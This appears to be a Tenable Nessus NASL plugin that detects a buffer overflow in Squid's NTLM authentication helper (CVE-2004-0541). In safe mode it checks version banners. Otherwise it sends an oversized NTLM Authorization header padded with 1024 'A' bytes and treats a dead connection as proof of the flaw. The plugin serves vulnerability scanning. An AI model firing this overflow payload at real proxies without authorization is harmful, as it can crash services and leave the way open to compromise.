#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(12294);
  script_version ("$Revision: 1.13 $");
  script_cve_id("CVE-2004-0541");
  script_bugtraq_id(10500);
  script_xref(name:"OSVDB", value:"6791");

  script_name(english:"Squid ntlm_check_auth Function NTLM Authentication Helper Password Handling Remote Overflow");
  script_summary(english:"Squid Remote NTLM auth buffer overflow");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:'The remote server is vulnerable to a remote buffer overflow in
the NTLM authentication routine.  Exploitation of this bug
can allow remote attackers to gain access to confidential
data.  Squid 2.5*-STABLE and 3.*-PRE are reported vulnerable.'
  );

  script_set_attribute(
    attribute:'solution',
    value:'Apply the relevent patch or upgrade to the latest version.'
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=107'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C'
  );

  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
  script_family(english:"Firewalls");
  script_dependencies("find_service1.nasl", "proxy_use.nasl");
  script_require_ports("Services/http_proxy", 8080, 3128);

  exit(0);
}


# start script

include("http_func.inc");

port = get_kb_item("Services/http_proxy");
if (! port)
	port = 3128;

if(! get_port_state(port))
	exit(0);


if (safe_checks() )
{
	# up to 25 chars won't overwrite any mem in SQUID NTLM helper auth
	malhost = string("http://www.f0z73", rand() % 65536, "tinker.com/");
	malreq = string("GET ", malhost, " HTTP/1.1\r\nHost: ", malhost, "\r\n");
	malreq += string("Authorization: NTLM ", crap(20), "=\r\n\r\n");

	soc = open_sock_tcp(port);
	if (! soc)
		exit(0);

	send(socket:soc, data:malreq);
	r = http_recv(socket:soc);
	close(soc);

	if ( ! r ) exit(0);

	if (egrep(string:r, pattern:"^Server Squid/(2\.5\.STABLE[0-5]([^0-9]|$)|3\.0\.PRE|2\.[0-4]\.)") )
	{
		mymsg =  string("According to it's version number, the remote SQUID Proxy\n");
		mymsg += string("may be vulnerable to a remote buffer overflow in it's NTLM\n");
		mymsg += string("authentication component, if enabled.  Run Nessus without safe\n");
		mymsg += string("checks to actually test the overflow\n");
		security_hole(port:port, data:mymsg);
		exit(0);
	}
}
else
{
	# we'll send more than 25 chars in NTLM auth...
	malhost = string("http://www.f0z73", rand() % 65536, "tinker.com/");
	malreq = string("GET ", malhost, " HTTP/1.1\r\nHost: ", malhost, "\r\n");
	malreq += string("Authorization: NTLM ", crap(20), "=\r\n\r\n");
	soc = open_sock_tcp(port);
	if (! soc)
		exit(0);

	send(socket:soc, data:malreq);
	r = http_recv(socket:soc);
	if (! r) exit(0);
	close(soc);



	malhost = string("http://www.f0z73", rand() % 65536, "tinker.com/");
	malreq = string("GET ", malhost, " HTTP/1.1\r\nHost: ", malhost, "\r\n");
	malreq += string("Authorization: NTLM TlRMTVNTUAABAAAAl4II4AAA", crap(data:"A", length:1024), "=\r\n\r\n");
	soc = open_sock_tcp(port);
	if (! soc)
		exit(0);

	send(socket:soc, data:malreq);
	r = http_recv(socket:soc);
	if (! r)
		security_hole(port);

	close(soc);
	exit(0);
}
